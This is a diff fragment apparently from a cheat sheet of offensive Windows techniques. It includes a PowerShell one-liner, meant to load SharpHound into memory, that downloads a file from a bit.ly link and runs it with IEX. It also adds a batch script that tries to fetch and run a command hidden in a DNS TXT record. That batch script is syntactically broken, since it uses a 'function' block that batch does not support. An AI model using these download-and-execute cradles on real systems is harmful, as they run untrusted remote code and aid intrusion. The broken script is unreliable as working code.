@@ -93,6 +93,23 @@ powershell -Command "Write-Host 'Remote download of SharpHound.ps1 into memory, 
   
 (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e', 'Default_File_Path.ps1'); IEX ((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1') | ForEach-Object {[Char]$_})))
 
+**
+
+
+@echo off
+setlocal enabledelayedexpansion
+
+rem Creating a custom nslookup function
+function nslookup {
+  "%windir%\system32\nslookup.exe" %* > nul
+  echo.
+  echo whoami
+}
+
+rem Using the custom nslookup function
+for /f "delims=" %%i in ('powershell -command ". (nslookup -q=txt example.com 8.8.8.8)[-1]"') do set result=%%i
+echo %result%
+
 
 
 
